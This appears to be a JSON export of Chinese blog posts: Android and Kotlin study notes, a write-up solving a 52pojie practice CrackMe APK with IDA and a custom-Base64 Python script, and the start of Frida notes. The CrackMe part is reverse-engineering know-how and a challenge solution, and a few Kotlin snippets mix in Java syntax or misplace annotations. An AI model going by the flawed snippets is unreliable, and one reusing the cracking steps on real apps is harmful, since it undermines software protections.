[{"content":"Activity\r基本介绍\rActivity 是 Android 四大组件中最基本也是最常用的组件之一，它通常代表着一个带有用户界面的单一屏幕。用户在应用中看到的每一个界面，几乎都是一个 Activity。\n创建的Activity需要：\n继承Android的Activity类 在AndroidManifest.xml中注册 生命周期\rActivity的生命周期回调方法按顺序主要包括：\nonCreate(): 必须实现此方法。在系统首次创建 Activity 时调用。在这里进行所有的静态设置，比如创建视图（setContentView()）、绑定数据等。此方法接收一个 Bundle 对象，其中包含 Activity 先前保存的状态（如果存在）。 onStart(): 当 Activity 对用户可见时调用。 onResume(): 当 Activity 进入前台并开始与用户交互时调用。Activity 此时位于任务栈（Task Stack）的顶部。 onPause(): 当系统即将启动另一个 Activity 时调用。此方法通常用于提交未保存的更改、停止动画或其他消耗 CPU 的操作。此方法的执行速度必须非常快。 onStop(): 当 Activity 对用户不再可见时调用。这可能是因为一个新的 Activity 启动了、一个现有的 Activity 被带到前台，或者该 Activity 即将被销毁。 onDestroy(): 在 Activity 被销毁前调用。这可能是因为用户完全关闭了 Activity，或者系统为了节省空间而临时销毁它。 onRestart(): 当一个已经停止的 Activity 准备再次启动时调用。 启动与跳转\rActivity 之间的跳转是通过 Intent (意图) 对象来完成的。Intent 是一个消息传递对象，你可以用它来向其他应用组件请求操作。\n启动方式:\n显式 Intent (Explicit Intent): 明确指定要启动的组件的类名。这通常用于应用内部的导航。\n1 2 3 4 // 从当前的 Activity 跳转到 DetailActivity // ::class.java 用于获取 KClass 对应的 Java Class 对象 val intent = Intent(this, DetailActivity::class.java) startActivity(intent) 隐式 Intent (Implicit Intent): 不指定具体组件，而是声明要执行的通用操作（如 \u0026ldquo;查看地图\u0026rdquo;、\u0026ldquo;拨打电话\u0026rdquo;），由系统来查找能够处理此 Intent 的组件。\n1 2 3 4 // 打开一个网页 val webpage: Uri = Uri.parse(\u0026#34;https://www.google.com\u0026#34;) val intent = Intent(Intent.ACTION_VIEW, webpage) startActivity(intent) Intent 还可以携带数据。数据以键值对的形式存储在 Bundle 对象中。\n发送数据:\n1 2 3 4 5 val intentWithData = Intent(this, DetailActivity::class.java).apply { putExtra(\u0026#34;USER_ID\u0026#34;, 123) putExtra(\u0026#34;USER_NAME\u0026#34;, \u0026#34;Alice\u0026#34;) } startActivity(intentWithData) 接收数据: 在目标 Activity 的 onCreate() 方法中：\n1 2 3 4 Intent intent = getIntent(); val userId = intent.getIntExtra(DetailActivity.EXTRA_USER_ID, -1) // -1 是默认值 val userName = intent.getStringExtra(DetailActivity.EXTRA_USER_NAME) 任务栈 Task Stack\rAndroid 系统使用 任务（Task） 来管理用户与应用的一次交互。一个任务就是一组 Activity 的集合，以 栈（Stack） 的形式排列，这个栈被称为 返回栈（Back Stack）。\nActivity启动模式\n你可以在 AndroidManifest.xml 文件的 \u0026lt;activity\u0026gt; 标签中使用 android:launchMode 属性来设置启动模式。\n主要有四种启动模式：\nstandard (标准模式): 默认模式。每次启动 Activity 都会创建一个新的实例，并将其压入当前任务的返回栈。一个任务栈中可以有多个相同的 Activity 实例。 singleTop (栈顶复用模式): 如果要启动的 Activity 已经位于任务栈的顶部，那么系统不会创建新的实例，而是直接调用该实例的 onNewIntent() 方法。如果该 Activity 不在栈顶，则会创建新实例。适用于需要处理频繁快速启动的场景，如搜索结果页。 singleTask (栈内复用模式): 在一个新的任务中启动该 Activity（如果 taskAffinity 不同），或者在已有任务中启动。在启动时，系统会检查整个任务栈中是否已存在该 Activity 的实例。如果存在，则会清除该实例之上的所有 Activity，使其回到栈顶，并调用其 onNewIntent() 方法。这保证了在同一个任务中只有一个该 Activity 的实例。常用于应用的主界面。 singleInstance (单实例模式): singleTask 的加强版。系统会为该 Activity 创建一个全新的任务，并且该任务中只包含这一个 Activity 实例。任何从该实例启动的其他 Activity 都会在别的任务中打开。适用于需要与应用其他部分完全隔离的 Activity，例如来电显示界面。 Activity中使用Toast\rToast是Android的一种短时间消息提醒的方式。需要定义一个Toast的触发点，例如一个按钮\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class MainActivity : AppCompatActivity() { private lateinit var binding: FirstActivityBinding override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.first_activity) // val button : Button = findViewById(R.id.button1) // button.setOnClickListener{ // Toast.makeText(this , \u0026#34;You click button1\u0026#34; , Toast.LENGTH_SHORT).show() // } binding = FirstActivityBinding.inflate(layoutInflater) setContentView(binding.root) binding.button1.setOnClickListener { Toast.makeText(this , \u0026#34;You Click button1\u0026#34; , Toast.LENGTH_SHORT).show() } } } 当然findViewById在Kotlin中可以简化使用view binding自动生成的，并且这也是Kotlin更推荐的写法。\nActivity使用Menu\rMenu使用要在res/menu创建xml\n1 2 3 4 5 6 7 8 \u0026lt;menu xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;item android:id=\u0026#34;@+id/add_item\u0026#34; android:title=\u0026#34;Add\u0026#34;/\u0026gt; \u0026lt;item android:id=\u0026#34;@+id/remove_item\u0026#34; android:title=\u0026#34;Remove\u0026#34;/\u0026gt; \u0026lt;/menu\u0026gt; 标签来创建一个菜单项，创建xml文件后需要重写onCreateOptionsMenu()来显示菜单\n1 2 3 4 5 override fun onCreateOptionsMenu(menu: Menu?): Boolean { //kotlin的属性访问语法，无需get...直接访问menuInflater属性 menuInflater.inflate(R.menu.main , menu) return true } 然后重写onOptionsItemSelected()来让菜单能够响应,根据item的id来弹出响应Toast\n1 2 3 4 5 6 7 8 9 override fun onOptionsItemSelected(item: MenuItem): Boolean { when (item.itemId) { R.id.add_item -\u0026gt; Toast.makeText(this, \u0026#34;You clicked Add\u0026#34;, Toast.LENGTH_SHORT).show() R.id.remove_item -\u0026gt; Toast.makeText(this, \u0026#34;You clicked Remove\u0026#34;, Toast.LENGTH_SHORT).show() } return true } Kotlin补充\r定义静态方法可以语法上模仿\u0026amp;\u0026amp;注解和顶层方法真正实现静态方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Util { fun doAction1() { println(\u0026#34;do action1\u0026#34;) } //伴生对象方法 doAction2 companion object { fun doAction2() { println(\u0026#34;do action2\u0026#34;) } } } //doAction1属于Util的每一个实例类 //doAction2属于Util类本身 一个类只有一个伴生对象，该对象内部的所有成员（属性和方法）都可以通过宿主类的名字直接访问。\n注解的方式则是在单例类或companion object中的方法上添加注解@JvmStatic\n1 2 3 4 @JvmStatic companion object { fun doAction2() {...} } 顶层方法就是不定义在任何类中的方法，kotlin会在编译的时候将其编译为静态方法。\n","date":"2025-07-08T10:04:26+08:00","permalink":"https://zhu1ang.github.io/p/%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%813/","title":"第一行代码（3）"},{"content":"Kotlin快速入门\r变量\rkotlin有两种声明变量的方式：\nval：声明不可变变量 var：声明可变变量 应当优先使用val来声明变量，保证程序的安全性 并且kotlin具有类型推导机制，val a = 10中kotlin会自动识别a为整型变量；kotlin要求所有变量的类型在编译时就必须是确定的，延迟赋值val a a = 10则会编译报错；可以显式声明类型val a: Int = 10，并且kotlin中所有的基本数据类型都变为对象数据类型，也即显式声明的a是一个类，有自己的方法和继承结构。\n函数\r1 2 3 4 //kotlin函数定义规则示例 fun methodName(param1: Int, param2: Int): Int { return 0 } 1 2 3 4 5 6 7 //kotlin的单表达式简化 // 传统写法 fun multiply(a: Int, b: Int): Int { return a * b } // 单表达式写法（代码更少，意图更清晰） fun multiply(a: Int, b: Int) = a * b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //kotlin支持默认参数和调用时指定命名参数 fun sendMessage( recipient: String, message: String = \u0026#34;Hello!\u0026#34;, // 默认参数 isImportant: Boolean = false // 默认参数 ) { println(\u0026#34;To: $recipient, Msg: $message, Important: $isImportant\u0026#34;) } // --- 调用方式 --- // 1. 只提供必需的参数 sendMessage(\u0026#34;Alice\u0026#34;) // 输出: To: Alice, Msg: Hello!, Important: false // 2. 提供部分参数 sendMessage(\u0026#34;Bob\u0026#34;, \u0026#34;How are you?\u0026#34;) // 输出: To: Bob, Msg: How are you?, Important: false // 3. 使用命名参数，可以不在乎顺序，可读性极高！ sendMessage(isImportant = true, recipient = \u0026#34;Charlie\u0026#34;) // 输出: To: Charlie, Msg: Hello!, Important: true 函数是一等公民：高阶函数与 Lambda\n这是 Kotlin 函数最核心、最强大的特性。 意味着函数可以像变量一样被传来传去。\n高阶函数 (Higher-Order Function): 一个函数如果接受另一个函数作为参数，或者返回一个函数，它就是高阶函数。 Lambda 表达式: 一种简洁的、用于表示“匿名函数”的语法，可以方便地作为参数传递。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 1. 定义一个高阶函数 calculate // 它接受两个整数和一个“操作”函数作为参数 // (Int, Int) -\u0026gt; Int 是一个函数类型，表示接受两个Int并返回一个Int的函数 fun calculate(a: Int, b: Int, operation: (Int, Int) -\u0026gt; Int): Int { return operation(a, b) } fun main() { // 2. 定义具体的“操作”函数 fun add(a: Int, b: Int) = a + b val subtract = { a: Int, b: Int -\u0026gt; a - b } // 使用 Lambda 定义一个减法操作 // 3. 调用高阶函数 val sumResult = calculate(10, 5, ::add) // 传入一个已有的函数引用 val subResult = calculate(10, 5, subtract) // 传入一个 Lambda 变量 // 4. 最常用、最简洁的 Lambda 用法（尾随 Lambda） // 如果 Lambda 是函数的最后一个参数，可以把它移到括号外面 val mulResult = calculate(10, 5) { a, b -\u0026gt; println(\u0026#34;Performing multiplication...\u0026#34;) a * b // Lambda 的最后一行是返回值 } println(\u0026#34;Sum: $sumResult, Subtract: $subResult, Multiply: $mulResult\u0026#34;) // 输出: Sum: 15, Subtract: 5, Multiply: 50 } 控制流\rif \u0026amp;\u0026amp; when\rif的用法基本和Java一样，不同的是kotlin的if可以有返回值，也就是可以作为表达式直接给变量赋值。\n1 2 3 4 val a = 10 val b = 5 val max = if (a \u0026gt; b) a else b //作为表达式使用一定要有else分支，除非if分支抛出异常 when相当于switch-case语句，但是有更多的功能。\n1 2 3 4 5 6 7 val dayOfWeek = 6 when (dayOfWeek) { 1, 2, 3, 4, 5 -\u0026gt; println(\u0026#34;Weekday\u0026#34;) 6, 7 -\u0026gt; println(\u0026#34;Weekend\u0026#34;) else -\u0026gt; println(\u0026#34;Invalid day\u0026#34;) } // 支持使用,合并分支条件 1 2 3 4 5 6 7 8 val score = 85 when (score) { in 90..100 -\u0026gt; println(\u0026#34;Excellent\u0026#34;) in 80..89 -\u0026gt; println(\u0026#34;Good\u0026#34;) in 60..79 -\u0026gt; println(\u0026#34;Pass\u0026#34;) else -\u0026gt; println(\u0026#34;Fail\u0026#34;) } // 支持使用in检查范围或集合 1 2 3 4 5 6 7 val num = 10 when (num) { is Int -\u0026gt; println(\u0026#34;number is Int\u0026#34;) is Double -\u0026gt; println(\u0026#34;number is Double\u0026#34;) else -\u0026gt; println(\u0026#34;number not support\u0026#34;) } //支持使用is来进行类型检查 while \u0026amp;\u0026amp; for\rwhile的用法和Java用法基本一致，不在此讲述。\nkotlin的for-in循环结构，0..10表示[0,10]区间\n1 2 3 4 5 fun main() { for (i in 0..10) { println(i) } } 也可以使用until定义[0,10)的区间，使用step定义for-in中的步长，使用downTo定义降序区间\n面向对象\r类和对象的创建上和Java基本类似\n1 2 3 4 5 6 7 class Person { var name = \u0026#34;\u0026#34; var age = 0 fun eat() { println(name + \u0026#34; is eating. He is \u0026#34; + age + \u0026#34; years old.\u0026#34;) } } 但是这个类是无法被继承的，kotlin中需要使用open关键字声明类才可被继承，使用：进行继承声明。\n1 2 3 4 open class Person{...} class Student : Person(){ } kotlin中的构造函数分为主构造函数和次构造函数。\n主构造函数\r直接通过主构造函数初始换化\n1 2 3 4 5 6 7 // \u0026#34;name\u0026#34; 和 \u0026#34;age\u0026#34; 不仅是构造函数参数，还同时是这个类的属性 class Person(val name: String, var age: Int) // 使用 val person = Person(\u0026#34;Alice\u0026#34;, 30) println(person.name) //可以直接访问属性 \u0026#34;Alice\u0026#34; person.age = 31 // age 是 var，可以修改 通过init块，init块属于主构造函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Customer(val name: String, creditLimit: Double) { // creditLimit 只是一个参数，不是属性 // 这是 Customer 的一个属性，它的值基于主构造函数的参数计算得出 val finalCreditLimit: Double // 初始化块，属于主构造函数 init { println(\u0026#34;Customer created for $name\u0026#34;) require(creditLimit \u0026gt; 0) { \u0026#34;Credit limit must be positive.\u0026#34; } // 参数验证 this.finalCreditLimit = creditLimit * 1.1 // 执行初始化逻辑 } } // 使用 val customer = Customer(\u0026#34;Bob\u0026#34;, 1000.0) // 输出: Customer created for Bob println(customer.finalCreditLimit) // 输出: 1100.0 次构造函数\r核心特点：\n位置：定义在类体 {...} 内部。 关键字：必须使用 constructor 关键字。 数量：一个类可以有多个次构造函数。 委托规则 (Delegation)：这是最关键的一条规则！ 每一个次构造函数都必须直接或间接地委托给主构造函数。委托通过 this(...) 关键字实现。 为什么必须委托给主构造函数？ 因为主构造函数和 init 块是类的核心初始化逻辑。通过强制委托，可以保证无论你调用哪个构造函数，这个核心逻辑（包括属性初始化）都一定会被执行，从而保证了对象状态的一致性和完整性。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Person(val name: String, var age: Int) { // 主构造函数 // init 块，属于主构造函数 init { println(\u0026#34;Person object initialized for $name with age $age\u0026#34;) } // 次构造函数 constructor(name: String) : this(name, 0) { // 1. 委托给主构造函数 // 2. 在主构造函数和 init 块执行完毕后，才会执行这里的代码 println(\u0026#34;Secondary constructor called, default age set to 0\u0026#34;) } } // 使用 println(\u0026#34;--- Creating p1 with primary constructor ---\u0026#34;) val p1 = Person(\u0026#34;Alice\u0026#34;, 30) println(\u0026#34;\\n--- Creating p2 with secondary constructor ---\u0026#34;) val p2 = Person(\u0026#34;Charlie\u0026#34;) println(\u0026#34;p2\u0026#39;s age is ${p2.age}\u0026#34;) 接口\rkotlin的接口用法和功能基本和Java一致。kotlin 接口可以定义属性：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 interface Named { // 1. 抽象属性：实现类必须重写它 val name: String // 2. 带默认实现的属性：实现类可以继承或重写 val displayName: String get() = \u0026#34;Name: $name\u0026#34; // 使用了上面的抽象属性 name } class User(override val name: String) : Named { // 必须重写抽象属性 name // 自动继承了 displayName 的实现 } fun main() { val user = User(\u0026#34;Alice\u0026#34;) println(user.name) // 输出: Alice println(user.displayName) // 输出: Name: Alice } 另外函数修饰符对比：\n修饰符 Java Kotlin public 显式声明。随处可见。在任何包的任何类中都可以访问。 默认！随处可见。与 Java 的 public 含义相同，但如果你不写任何修饰符，它就是 public。 protected 包内可见 + 子类可见。在同一个包内的任何类中可见，并且在不同包的子类中也可见。 仅子类可见 (更严格)。只能在当前类和其子类中可见。它对同一个包内的其他非子类是不可见的。 private 仅类内可见。只能在声明它的那个类内部访问。 类内/文件内可见。- 成员函数/属性： 仅在声明它的类内部可见。- 顶层函数/属性： 仅在声明它的文件 (.kt) 内部可见。 Package-private(包私有) 默认行为 (不写修饰符)。只能在同一个包 (package) 内访问。这是 Java 中非常重要的一个封装层级。 没有直接对应。Kotlin 中没有包私有的概念。最接近的是 internal，但范围更广。 internal (不存在) 模块内部可见。这是 Kotlin 的新特性。它表示在同一个 Gradle 模块 (Module) 内的任何地方都是可见的。这是为了更好地支持大型项目和库的开发。 数据类与单例类\r数据类专门持有数据。\n1 2 // Kotlin Data Class data class User(val name: String, var age: Int) 使用上述方法定义一个数据类，kotlin会自动生成：\nequals() 和 hashCode()\n这是数据类最有用的特性之一。它实现了结构相等性的比较。两个数据类实例，如果其构造函数中的所有属性值都相等，那么 equals() 就返回 true。 hashCode() 也会根据构造函数属性的值来计算，确保了相等的对象有相等的哈希码。这使得数据类可以安全地用作 HashMap 的键或在 HashSet 中存储。 toString()等其他方法\n数据类的规则与限制：\n主构造函数必须至少有一个参数。 主构造函数的所有参数必须标记为 val 或 var。 数据类不能是 abstract, open, sealed 或 inner。 而单例模式是一种确保一个类在整个应用程序中只有一个实例，并提供一个全局访问点来获取这个实例的设计模式。它常用于管理共享资源，如数据库连接、网络客户端或配置管理器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // 使用 object 关键字声明一个单例类 object AppSettings { // 像普通类一样，可以有属性 const val API_VERSION = \u0026#34;1.2\u0026#34; var theme: String = \u0026#34;dark\u0026#34; // 也可以有方法 fun loadSettings() { println(\u0026#34;Loading settings...\u0026#34;) // 模拟加载操作 theme = \u0026#34;light\u0026#34; } fun printSettings() { println(\u0026#34;API Version: $API_VERSION, Theme: $theme\u0026#34;) } } fun main() { // 你不能像这样创建实例，会报错： \u0026#34;Cannot access \u0026#39;private\u0026#39; constructor of object \u0026#39;AppSettings\u0026#39;\u0026#34; // val settings = AppSettings() // 直接通过名称访问单例的属性和方法 println(\u0026#34;Accessing for the first time...\u0026#34;) AppSettings.loadSettings() // 此时 AppSettings 实例被创建并初始化 AppSettings.printSettings() println(\u0026#34;\\nChanging settings...\u0026#34;) AppSettings.theme = \u0026#34;blue\u0026#34; // 修改的是同一个实例的属性 // 在程序的任何其他地方访问，都是同一个实例 someOtherFunction() } fun someOtherFunction() { println(\u0026#34;\\nAccessing from another function:\u0026#34;) // AppSettings.loadSettings() 不会再次执行初始化块，因为实例已存在 AppSettings.printSettings() } Lambda编程初见\r集合的创建和遍历\rKotlin的集合分为：\n只读集合 (List, Set, Map):\n创建后，你不能添加、删除或修改其元素。 它们提供的是一种“只读”视图。 使用 listOf(), setOf(), mapOf() 等函数创建。 可变集合 (MutableList, MutableSet, MutableMap):\n创建后，你可以自由地添加 (add)、删除 (remove) 或修改 (set) 其元素。 使用 mutableListOf(), mutableSetOf(), mutableMapOf() 等函数创建。 列表简单示例如下：\n1 2 3 4 // 使用 listOf() 函数 val readOnlyList: List\u0026lt;String\u0026gt; = listOf(\u0026#34;Apple\u0026#34;, \u0026#34;Banana\u0026#34;, \u0026#34;Cherry\u0026#34;, \u0026#34;Apple\u0026#34;) println(readOnlyList) // [Apple, Banana, Cherry, Apple] // readOnlyList.add(\u0026#34;Date\u0026#34;) // 编译错误！List 没有 add 方法 1 2 3 4 5 6 7 8 9 // 使用 mutableListOf() 函数 val mutableList: MutableList\u0026lt;String\u0026gt; = mutableListOf(\u0026#34;Apple\u0026#34;, \u0026#34;Banana\u0026#34;, \u0026#34;Cherry\u0026#34;) println(mutableList) // [Apple, Banana, Cherry] // 可以修改 mutableList.add(\u0026#34;Date\u0026#34;) mutableList.remove(\u0026#34;Banana\u0026#34;) mutableList[0] = \u0026#34;Apricot\u0026#34; // 通过索引修改 println(mutableList) // [Apricot, Cherry, Date] 空指针检查\r1 2 3 4 5 6 7 8 // 1. 不可空类型 (默认) var a: String = \u0026#34;hello\u0026#34; // a = null // 编译错误！一个不可空的 String 不能被赋值为 null // 2. 可空类型 (使用 ?) var b: String? = \u0026#34;world\u0026#34; b = null // OK println(b) Kotlin提供了一些工具来进行可空类型的处理\n1 2 3 4 //?.操作符 val name : String? = \u0026#34;kotlin\u0026#34; val length1 = name?.length //name不为空所以这里的length1值是6，为空则这里的值是null 1 2 3 4 5 //?:操作符 val name: String? = null // 如果 name 不为 null，则返回其长度；否则，返回 0 val length = name?.length ?: 0 println(length) // 0 1 2 3 4 //!!断言操作符 val name: String? = \u0026#34;Alice\u0026#34; val length = name!!.length //开发者断言name不为空，告诉编译器无需进行检查 Kotlin小技巧\r字符串内嵌表达式，通过${}的方式嵌入表达式，表达式中仅有一个变量，可以省略{}\n\u0026quot;hello, ${obj.name}. nice to meet you!\u0026quot;\n","date":"2025-07-02T14:08:12+08:00","permalink":"https://zhu1ang.github.io/p/%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%812/","title":"第一行代码（2）"},{"content":"Android简介\rAndroid的系统架构如下（这里我们不关注HAL层）：\nLinux内核层 Android的底层，为Android硬件提供驱动 系统运行时库 C/C++等为Android提供特性支持的库，例如SQLite。 Android Runtime，允许开发者使用Java编写Android应用 ART虚拟机（Android5.0后），每个应用有自己的进程和虚拟机实例 应用框架层 Java framework，提供各种开发的API 应用层 开发的app和系统应用运行在这一层 Android开发特性：\n四大组件 Activity 用户看到的界面 Service 用户不可见，一些后台服务和耗时服务 BroadcastReceiver 允许应用接收广播和发送广播 ContentProvider 实现应用程序直接共享数据的功能 系统控件 Android提供丰富的系统控件并且支持自定义 SQLite 轻量级数据库，支持Android API访问 多媒体 MediaPlayer等等，具体业务方面的 Android Studio环境配置不在此赘述，快进到新建了一个empty activity的项目\nAndroid项目结构\r.gradle \u0026amp;\u0026amp; .idea Android studio自动生成，无需理会 app 项目中的代码、资源等，开发工作基本在此目录下完成 gradle gradle wrapper的配置文件，相当于给每个项目提供一个gradle环境而无需配置全局的gradle .gitignore 指定文件排除版本控制，版本控制后续学习（蛮重要的学习的点） build.gradle 项目全局的构建脚本，指定如何构建项目 app目录下也有一个同名app级构建脚本 gradle.properties 全局gradle配置文件，会影响项目中所有gradle编译脚本 gradlew和gradlew.bat 命令行界面执行gradle命令 local.properties 指定本机的Android SDK路径，通常不需要修改 settings.gradle 指定项目中所有引入的模块 app目录详解\rbuild\u0026amp;\u0026amp;libs\n均不在自动创建\nbuild目录：为了简化初始项目视图，仅在首次构建后生成，其功能和重要性未变。\nlibs目录：为了引导开发者采用更现代化、更高效的远程依赖管理方式（通过Gradle和版本目录），不再作为默认文件夹。但为保证灵活性，开发者仍可按需手动创建并配置使用。\nandroidTest\n编写测试用例，可以对项目进行自动化测试 Java\nJava代码和kotlin代码存放位置 res\n资源目录，布局文件、图片、字符串等资源 AndroidManifest.xml\n项目的配置文件，四大组件均需在此注册，应用的特殊权限也在此指定 test\nJava或kotlin相关的测试用例在此编写，不能有Android相关代码测试 .gitignore\napp模块内指定排除版本控制 build.gradle\napp级别的构建脚本 proguard-rules.pro\n项目代码的混淆规则 res目录详解\rdrawable开头存放图片；mipmap开头存放应用图标；values开头存放字符串、样式、颜色等配置；layout存放布局文件，这里没有这个目录的原因是最新的Android studio新建的empty activity项目使用Jetpack Compose布局方式，不通过xml文件，而通过Composable函数来描述UI。\nvalues/strings.xml文件内容如下：\n1 2 3 4 \u0026lt;resources\u0026gt; \u0026lt;string name=\u0026#34;app_name\u0026#34;\u0026gt;demo\u0026lt;/string\u0026gt; \u0026lt;/resources\u0026gt; \u0026lt;!--应用程序名的字符串--\u0026gt; 两种方式可以使用这个字符串：\n在代码中通过R.string.app_name可以获得该字符串的引用。\n在XML中通过@string/app_name可以获得该字符串的引用。\nbuild.gradle详解\r项目级：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // build.gradle.kts // 声明构建脚本本身使用的插件，并统一定义它们的版本 // 这是现代 Gradle 的推荐做法，取代了旧的 buildscript {} 块 plugins { // Android 应用插件，版本号在此处统一定义 id(\u0026#34;com.android.application\u0026#34;) version \u0026#34;8.4.0\u0026#34; apply false // Kotlin Android 插件，版本号在此处统一定义 id(\u0026#34;org.jetbrains.kotlin.android\u0026#34;) version \u0026#34;1.9.23\u0026#34; apply false // 如果使用 Jetpack Compose，也在这里定义 id(\u0026#34;org.jetbrains.kotlin.plugin.compose\u0026#34;) version \u0026#34;1.9.23\u0026#34; apply false // 如果使用 KSP (Kotlin Symbol Processing) id(\u0026#34;com.google.devtools.ksp\u0026#34;) version \u0026#34;1.9.23-1.0.19\u0026#34; apply false // 如果使用 Hilt 进行依赖注入 id(\u0026#34;com.google.dagger.hilt.android\u0026#34;) version \u0026#34;2.51.1\u0026#34; apply false } app级：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 // build.gradle.kts // 1. 应用插件 plugins { // 应用在项目级文件中声明的 Android 应用插件 id(\u0026#34;com.android.application\u0026#34;) // 应用 Kotlin Android 插件 id(\u0026#34;org.jetbrains.kotlin.android\u0026#34;) } // 2. Android 特定配置 android { // 应用的命名空间，必须唯一，通常基于包名 namespace = \u0026#34;com.example.myapplication\u0026#34; // 编译时使用的 SDK 版本 compileSdk = 34 defaultConfig { // 应用的唯一标识符，用于发布到应用商店 applicationId = \u0026#34;com.example.myapplication\u0026#34; // 最低支持的 Android 版本 minSdk = 24 // 目标 Android 版本，应用期望在此版本上运行 targetSdk = 34 // 应用内部版本号，整数，每次发布新版时应增加 versionCode = 1 // 展示给用户的版本名 versionName = \u0026#34;1.0\u0026#34; // AndroidJUnit 测试运行器 testInstrumentationRunner = \u0026#34;androidx.test.runner.AndroidJUnitRunner\u0026#34; // 为 Compose 测试配置 vectorDrawables { useSupportLibrary = true } } // 3. 构建类型配置 buildTypes { release { // 是否开启代码混淆 isMinifyEnabled = false // 混淆规则文件 proguardFiles( getDefaultProguardFile(\u0026#34;proguard-android-optimize.txt\u0026#34;), \u0026#34;proguard-rules.pro\u0026#34; ) } debug { // debug 版本的特定配置 } } // 4. Java 和 Kotlin 编译选项 compileOptions { sourceCompatibility = JavaVersion.VERSION_1_8 targetCompatibility = JavaVersion.VERSION_1_8 } kotlinOptions { jvmTarget = \u0026#34;1.8\u0026#34; } // 5. Compose 或其他构建特性配置 buildFeatures { compose = true } } // 6. 依赖项配置 dependencies { // 核心依赖 implementation(\u0026#34;androidx.core:core-ktx:1.13.1\u0026#34;) implementation(\u0026#34;androidx.lifecycle:lifecycle-runtime-ktx:2.8.1\u0026#34;) implementation(\u0026#34;androidx.activity:activity-compose:1.9.0\u0026#34;) } 日志工具Log\r方法 级别 含义和使用场景 Log.v() Verbose (详细) 最低优先级。 用于输出最详尽、琐碎的日志信息。通常只在开发深度问题时开启，因为信息量非常大。例如：追踪一个变量在循环中的每一次变化。 Log.d() Debug (调试) 用于调试。 输出对调试有帮助的信息，以帮助分析代码执行流程。这是开发过程中最常用的级别。例如：网络请求的发送、关键方法的进入点。 Log.i() Info (信息) 用于输出有意义的、常规的运行时事件。 这些信息有助于了解应用的运行状态，但又不是错误。例如：用户成功登录、后台任务开始或结束。 Log.w() Warn (警告) 用于输出潜在的问题或已弃用的 API 调用。 这些情况虽然目前不影响应用运行，但可能在未来导致错误，需要开发者关注。例如：缓存即将满、API 响应了一个非预期的格式。 Log.e() Error (错误) 最高优先级。 用于输出已经发生并导致问题的严重错误。这通常是需要立即被解决的。例如：捕获到的异常（Crash）、关键数据加载失败。 每个日志方法有多个重载形式，常用的参数是 TAG（标签）和MSG（你想打印的日志消息）。\n还有一种异常处理时非常有用的重载：\n1 2 Log.e(String tag, String msg, Throwable tr); //tr: 一个异常对象。当你 `catch` 住一个异常时，将它作为第三个参数传入，Logcat 会完整地打印出异常的堆栈轨迹 (Stack Trace)，这对于定位错误根源至关重要。 ","date":"2025-07-01T13:46:38+08:00","permalink":"https://zhu1ang.github.io/p/%E7%AC%AC%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%811/","title":"第一行代码（1）"},{"content":"","date":"2025-02-26T14:16:12+08:00","permalink":"https://zhu1ang.github.io/p/52study_10/","title":"安卓逆向入门（十）"},{"content":"题目\r新手练手学习挺好的\n思路\rapk比较简单，在MainActivity里能发现，疑似密码的字符串和配套的逻辑（正确错误字符串提示\n于是直接根据这里的解密逻辑，From Base64(input_str + 1) = \u0026ldquo;52pojieCrackMe2020\u0026rdquo;，将解密得到的字符串输入：MS5ub2JqZUVjcmFja01lMjAyMA==，但是结果不对\n再仔细回看这段代码，发现这里真正的click方法应该是View.OnClickListener\n而可以在Activity类里发现，AnonymousClass1实现了这个接口 并且具体的方法是在本地的lib0.0.so文件里的，然后转到IDA\n不是很擅长分析so，但是这里应该才是正确的匹配密码\n在匹配监听器里发现了，自定义的base64编码表\n解密脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import base64 # 自定义Base64变种字符集 base64_variants = \u0026#34;KLMNOPQRSTABCDEFGHIJUVWXYZabcdopqrstuvwxefghijklmnyz0123456789+/\u0026#34; # 标准Base64字符集 base64_standard = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; # 创建映射字典 variant_to_standard = {base64_standard[i]: base64_variants[i] for i in range(len(base64_standard))} # 对字符串进行标准Base64编码 input_string = \u0026#34;52pojie2020CM\u0026#34; encoded_standard = base64.b64encode(input_string.encode()).decode() # 将标准Base64编码转为变种Base64编码，跳过 \u0026#39;=\u0026#39; 填充符号 encoded_variant = \u0026#39;\u0026#39;.join([variant_to_standard.get(char, char) for char in encoded_standard]) print(f\u0026#34;Encoded using variant Base64: {encoded_variant}\u0026#34;) 但是不知道怎么能从IDA的代码里看出来变种base编码，只能看到映射表去猜。\n","date":"2025-02-20T14:31:34+08:00","permalink":"https://zhu1ang.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E5%8C%BAcrackme%E7%BB%83%E4%B9%A0/","title":"52pjCrackMe"},{"content":"frida基础知识\r操作模式:\n操作模式 描述 优点 主要用途 CLI（命令行）模式 通过命令行直接将JavaScript脚本注入进程中，对进程进行操作 便于直接注入和操作 在较小规模的操作或者需求比较简单的场景中使用 RPC模式 使用Python进行JavaScript脚本的注入工作，实际对进程进行操作的还是JavaScript脚本，可以通过RPC传输给Python脚本来进行复杂数据的处理 